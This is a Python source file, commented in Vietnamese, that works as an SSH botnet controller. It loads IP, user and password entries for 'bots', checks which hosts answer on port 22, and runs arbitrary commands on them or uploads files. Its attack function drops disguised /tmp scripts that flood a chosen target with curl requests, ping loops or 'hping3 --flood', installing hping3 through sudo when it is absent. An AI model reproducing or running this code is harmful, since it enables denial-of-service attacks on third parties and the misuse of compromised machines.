import paramiko
import time
import random
import socket
import fileinput
import os

ip_equipos=[]
user_equipos=[]
password_equipos=[]
hping_equipos=[]
ip_equipos_alive=[]
user_equipos_alive=[]
password_equipos_alive=[]
hping_equipos_alive=[]
total_equipos=0
total_bots=0

def load_ataque():

    global total_equipos

    with open("equipos.txt","r") as e:

        for line in e:
            ip_equipos.append(line.split(":")[0])
            user_equipos.append(line.split(":")[1])
            password_equipos.append(line.split(":")[2])
            hping_equipos.append(line.strip("\n").split(":")[3])
            total_equipos+=1



def list_of_bots():
#Hiện thị các bot có sẵn để sử dụng tấn công
    print('''
+--------------+
| List of bots |
+--------------+''')

    for i in range(total_equipos):
        
        print(f'''       |
       +---> Bot {[i]}: IP:{ip_equipos[i]} USER:{user_equipos[i]} PASS={password_equipos[i]}''')



def select_bot(option):
#Lựa chọn một bot cụ thể để thực hiện tấn công
    ip=""
    password=""
    user=""

    for i in range(total_equipos):

        if i==option:
            ip=ip_equipos[i]
            password=password_equipos[i]
            user=user_equipos[i]

    return ip, user, password




def all_bots(comando, see):
#Hàm all_bots(comando, see) sẽ lặp qua tất cả các bot đang hoạt động (được lưu trong ip_equipos_alive, user_equipos_alive, password_equipos_alive) 
# và thực hiện gửi lệnh tới mỗi bot.
    for i in range(total_bots):

        try:
            #Trong quá trình thực hiện, mỗi bot sẽ được kết nối qua giao thức SSH bằng thư viện paramiko, 
            # sau đó, lệnh được gửi tới bằng hàm exec_command(comando) của paramiko.
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

            ssh.connect(ip_equipos_alive[i], username=user_equipos_alive[i], password=password_equipos_alive[i], timeout=0.5)

            stdin, stdout, stderr = ssh.exec_command(comando)

            print(f'[*] Command sent IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')

            if see == 'y':
                #Nếu tham số see được đặt thành 'y', đầu ra của lệnh sẽ được in ra. 
                #Nếu xảy ra lỗi khi kết nối hoặc thực hiện lệnh tới bot nào đó, thông báo lỗi sẽ được in ra.
                print(stdout.read().decode())
                print("\n")

            ssh.close()
            #mỗi bot sẽ được đóng kết nối SSH qua ssh.close().
            continue

        except paramiko.ssh_exception.AuthenticationException:

            print(f'[*] Authentication Failed IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')

        except paramiko.SSHException:

            print(f'[*] The request was rejected or the channel was closed IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')

        except paramiko.BadHostKeyException:

            print(f'[*] The server’s host key could not be verified IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')

        except socket.error:

            print(f'[*] Socket error ocurred IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')

        ssh.close()



def single_bot(comando, see, bot, user, password):
#comando: lệnh sẽ được thực thi trên thiết bị.
#see: biến boolean để xác định liệu output của lệnh được thực thi có được hiển thị ra màn hình hay không.
#bot: địa chỉ IP của thiết bị.
#user: tên đăng nhập để kết nối tới thiết bị.
#password: mật khẩu để kết nối tới thiết bị.
        try:
#   Trong khối try, trước khi thực hiện kết nối SSH đến host, ta cài đặt chính sách sẽ tự động 
#thêm host chưa được xác thực vào danh sách known_hosts bằng lệnh ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()). 
#   Sau đó, ta sử dụng hàm ssh.connect() để kết nối đến remote host với các tham số đầu vào là địa chỉ IP của remote host, tên đăng nhập và mật khẩu.
#Nếu mật khẩu của remote host được đặt giống với chuỗi 'abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh', 
#thì thông báo "False Authentication" sẽ được in ra và hàm sẽ kết thúc và trả về giá trị 0.
#   Sau khi kết nối đến remote host, ta sử dụng ssh.exec_command() để thực hiện câu lệnh comando trên remote host. 
#Nếu tham số see được đặt là 'y', kết quả trả về sẽ được in ra màn hình.
#Cuối cùng, ta đóng kết nối SSH với remote host bằng hàm ssh.close(). 
#Nếu bất kỳ lỗi SSH nào xảy ra, chúng sẽ được bắt và in ra màn hình trong các khối except.
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

            ssh.connect(bot, username=user, password=password)

            if password == 'abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh':
                    print(f'[*] False Authentication')
                    return 0

            stdin, stdout, stderr = ssh.exec_command(comando)

            print(f'[*] Command sent IP:{bot} USER:{user} PASS={password}\n')

            if see == 'y':
                print(stdout.read().decode())
                print("\n")

            ssh.close()

        except paramiko.ssh_exception.AuthenticationException:

            print(f'[*] Authentication Failed IP:{bot} USER:{user} PASS={password}')

        except paramiko.SSHException:

            print(f'[*] The request was rejected or the channel was closed IP:{bot} USER:{user} PASS={password}')

        ssh.close()




def sftp(bot, user, password, filepath, localpath):
#là một một hàm sftp để thực hiện việc truyền tệp tin từ máy định tuyến tới máy khác thông qua giao thức SFTP (SSH File Transfer Protocol).

#bot: là địa chỉ IP của máy đích.
#user: là tên đăng nhập của người dùng.
#password: là mật khẩu của người dùng.
#filepath: là đường dẫn tới tệp tin trên máy đích.
#localpath: là đường dẫn tới tệp tin trên máy định tuyến.
    try:
#Hàm sftp sử dụng module paramiko để thực hiện kết nối SFTP tới máy đích và truyền tệp tin. Đoạn code trong khối try sẽ thực hiện các bước sau:

#1.Tạo một đối tượng Transport và kết nối tới máy đích thông qua phương thức đăng nhập user và password.
#2.Tạo một đối tượng SFTPClient từ Transport.
#3.Sử dụng phương thức put() để chuyển tệp tin từ localpath tới filepath.
#4.Đóng kết nối SFTP và Transport.
        host,port = bot,22
        transport = paramiko.Transport((host,port))

        transport.connect(None,user,password)
   
        sftp = paramiko.SFTPClient.from_transport(transport)

        sftp.put(localpath,filepath)

        if sftp: sftp.close()
        if transport: transport.close()

        print(f'[*] The file was sent successfully IP:{bot} USER:{user} PASS={password}')
#Nếu có bất kỳ lỗi nào trong quá trình truyền tệp tin, chương trình sẽ ném ra một ngoại lệ tương ứng, ví dụ FileNotFoundError, IOError hoặc paramiko.SSHException. 
#Hàm sftp sẽ in ra thông báo tương ứng với lỗi nếu xảy ra lỗi, hoặc thông báo "The file was sent successfully" nếu quá trình truyền tệp tin thành công.
    except paramiko.SSHException:

        print("[*] Error in the negotiation of SFTP")

    except FileNotFoundError:

        print("[*] The LOCALPATH file was not found")

    except IOError:

        print("[*] File couldn't be sent, not enough permissions")




def bots_alive():
#Hàm kiểm tra các bot còn sống hay không
    global total_bots#Khai báo biến toàn cục total_bots và in ra tiêu đề cho danh sách các bot hoạt động.

    print('''
+--------------------+
| List of bots alive |
+--------------------+''')

    for i in range(total_equipos):#Sử dụng vòng lặp để lặp qua danh sách các bot được định nghĩa trước đó.

        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        location=(ip_equipos[i],22)#Tạo một socket mới với định dạng địa chỉ IPv4 và giao thức TCP.
        a_socket.settimeout(0.1)#Đặt thời gian timeout cho socket để tránh các kết nối kéo dài quá lâu.
        #Thực hiện kết nối đến IP của bot với cổng 22 (sử dụng SSH).
        result_of_check = a_socket.connect_ex(location)

        if result_of_check == 0:
            print(f'''       |
       +---> Bot {[i]}: IP:{ip_equipos[i]} USER:{user_equipos[i]} PASS={password_equipos[i]}''')
            a_socket.close()
            ip_equipos_alive.append(ip_equipos[i])
            user_equipos_alive.append(user_equipos[i])
            password_equipos_alive.append(password_equipos[i])
            hping_equipos_alive.append(hping_equipos[i])
            total_bots+=1#Tăng biến toàn cục total_bots lên 1 để đếm số lượng bot hoạt động.
    #Kiểm tra kết quả của kết nối đó, nếu kết quả trả về là 0, nghĩa là kết nối thành công, 
    #tiến hành in ra thông tin về bot đó (bằng cách sử dụng biến i để xác định bot thứ mấy trong danh sách), 
    #đóng kết nối socket và thêm thông tin của bot đó vào danh sách các bot hoạt động (ip_equipos_alive, user_equipos_alive, password_equipos_alive, và hping_equipos_alive).
    print(f'\nBots alive: {total_bots}')

    return total_bots



def attack(ip, command, puerto, tipo):
#Để thực hiện tấn công DDoS (tấn công từ chối dịch vụ) bằng cách sử dụng SSH (Secure Shell) và một số công cụ như hping3, curl hoặc ping.
#Hàm attack có 4 tham số đầu vào: 
# ip (địa chỉ IP của mục tiêu), 
# command (loại tấn công được sử dụng), 
# puerto (cổng được sử dụng bởi tấn công hping3) 
# tipo (loại tấn công được sử dụng bởi tấn công hping3).
    for i in range(total_bots):
#Đoạn mã sử dụng thư viện paramiko để thiết lập kết nối SSH đến các thiết bị (hoặc máy tính) mục tiêu. 
#Sau khi thiết lập kết nối SSH, đoạn mã sẽ thực hiện các hoạt động tấn công tùy thuộc vào loại tấn công được chọn.


        try:

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

            ssh.connect(ip_equipos_alive[i], username=user_equipos_alive[i], password=password_equipos_alive[i])

            if password_equipos_alive[i] == 'abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh':
                    print(f'[*] False Authentication')
                    continue

            numero=str(random.randrange(1000000, 10000000, 1))

            print(f'[*] Command sent IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}\n')

            if command == 1:#Nếu command bằng 1, đoạn mã sẽ sử dụng lệnh curl để gửi các yêu cầu HTTP tới địa chỉ IP của mục tiêu

                stdin, stdout, stderr = ssh.exec_command(f"touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do curl "+ip+"; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &", timeout=6)

            elif command == 2:#Nếu command bằng 2, đoạn mã sẽ sử dụng lệnh ping để gửi các gói tin ICMP tới địa chỉ IP của mục tiêu.

                d, e, f = ssh.exec_command(f"touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do ping "+ip+"; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &")

            elif command == 3:#Nếu command bằng 3, đoạn mã sẽ sử dụng công cụ hping3 để tấn công mục tiêu trên cổng puerto với loại tấn công tipo.

                if hping_equipos_alive[i] == "NS":

                    stdin, stdout, stderr = ssh.exec_command(f"sudo -S <<< '{password_equipos_alive[i]}' apt install hping3")
                    exit_status = stdout.channel.recv_exit_status()          # Blocking call

                    if exit_status == 0:
                        print("[*] Hping3 Installing Completed\n")
                    else:
                        print("[*] Hping3 Installing Failed, Error: ",exit_status+"\n")
                        continue

                    textToSearch = ip_equipos_alive[i]+":"+user_equipos_alive[i]+":"+password_equipos_alive[i]+":"+"NS"
                    textToReplace = ip_equipos_alive[i]+":"+user_equipos_alive[i]+":"+password_equipos_alive[i]+":"+"SI"
                    fileToSearch  = "equipos.txt"
                    tempFile = open( fileToSearch, 'r+' )

                    for line in fileinput.input( fileToSearch ):
                        tempFile.write( line.replace( textToSearch, textToReplace ) )
                    tempFile.close()

                    a,b,c=ssh.exec_command("touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'hping3 -p "+puerto+" "+tipo+" --flood "+ip+"'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n sudo -S <<< "+password_equipos_alive[i]+" ./system-tmp"+numero+".sh &\n")
                    time.sleep(1)
                    

                elif hping_equipos_alive[i] == "SI":

                    a,b,c=ssh.exec_command("touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'hping3 -p "+puerto+" "+tipo+" --flood "+ip+"'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n sudo -S <<< "+password_equipos_alive[i]+" ./system-tmp"+numero+".sh &\n")
                    time.sleep(1)

            ssh.close()

        except paramiko.ssh_exception.AuthenticationException:

            print(f'[*] Authentication Failed IP:{bot} USER:{user} PASS={password}')

        except paramiko.SSHException:

            print(f'[*] The request was rejected or the channel was closed IP:{bot} USER:{user} PASS={password}')

        ssh.close()

def delete_list():
    ip_equipos.clear()
    user_equipos.clear()
    password_equipos.clear()
    hping_equipos.clear()
    ip_equipos_alive.clear()
    user_equipos_alive.clear()
    password_equipos_alive.clear()
    hping_equipos_alive.clear()
    global total_equipos
    total_equipos=0
    global total_bots
    total_bots=0
